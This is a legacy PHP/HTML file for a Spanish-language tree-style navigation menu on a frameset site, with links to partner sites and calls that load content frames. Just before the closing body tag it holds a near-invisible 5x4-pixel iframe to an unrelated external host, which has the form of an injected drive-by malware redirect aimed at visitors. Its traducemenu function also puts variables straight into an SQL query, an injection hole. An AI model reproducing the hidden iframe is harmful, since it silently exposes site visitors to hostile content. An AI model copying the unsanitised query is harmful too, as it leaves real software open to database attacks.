<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }


?>
<HTML>
<HEAD><TITLE>Men� de navegaci�n estilo �rbol</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}
function xhola(s,x,t){
	cierratodo();
	cambiarsub(s,x,t);
}

function cambiar(item,cod,tit) {
	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   if (visible) {
	     obj.style.display="none";
	   } else {
	      obj.style.display="block";
	   }
	}
	if(cod>0){
		parent.frames['centro'].location='../carga_contenido.php?id_sel='+cod+'&tit='+tit
	}
	
}
function cambiarsub(item,cod,t) {
	parent.frames['centro'].location='<?=CFG_virtualPath?>prensa.php?item='+item+'&cod='+cod+'&tit='+t
}

function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
     key=document.getElementById("x" + divs[i].id);
   }
}

</script>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HEAD>
<BODY class="fondito">

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor" height="19"><small>&nbsp;</small></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td>


<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  <!--	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>-->
    <td class="divisor"><a class="link1" id="xuno" href="#"><?=traducemenu(7)?></a></td>
  </tr>
</table>

<div id="uno" style="margin-left: 0em;">
<!--<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2"  href="javascript:cambiarsub('1','','<?=traducemenu(87)?>');"><?=traducemenu(87)?></a></td>
  </tr>
</table>-->

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2"  href="javascript:cambiarsub('1','mdt','<?=traducemenu(88)?>');"><?=traducemenu(88)?></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2" href="http://www.scbf.com.br/not.php" target="_top"><?=traducemenu(89)?></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
		<?if ($lng=="esp"){?>
	<td><a class="link2" href="http://www.ahjc.cl/portada.php" target="_top"><?=traducemenu(171)?></a></td>
		<?}else {?>
	<td><a class="link2" href="http://www.ahjc.cl/eng/portada.php" target="_top"><?=traducemenu(171)?></a></td>
				 <?}?>  </tr>
</table>

</div>

<!--<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<!--<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>- ->
    <td class="divisor"><a class="link1" id="xdos" href="javascript:cierratodo();cambiar('dos',172,'<?=traducemenu(172)?>');"><?=traducemenu(172)?></a></td>
  </tr>
</table>
<div id="dos" style="display: none; margin-left: 0em;">
<!--<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2"  href="javascript:cambiarsub('2','','<?=traducemenu(173)?>');"><?=traducemenu(173)?></a></td>
  </tr>
</table>- ->

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2"  href="javascript:cambiarsub('2','mdt','<?=traducemenu(174)?>');"><?=traducemenu(174)?></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2" href="http://www.scbf.com.br/not.php" target="_top"><?=traducemenu(175)?></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
		<?if ($lng=="esp"){?>
	<td><a class="link2" href="http://www.ahjc.cl/portada.php" target="_top"><?=traducemenu(176)?></a></td>
		<?}else {?>
	<td><a class="link2" href="http://www.ahjc.cl/eng/portada.php" target="_top"><?=traducemenu(176)?></a></td>
				 <?}?>

  </tr>
</table>
-->
</div>
</td></tr></table>
<script>
//150
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../carga_contenido.php?id_sel=7&tit=<?=traducemenu(7)?>';
parent.frames['derecha'].location='../carga_derecha.php?id_sel=7';

</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
?>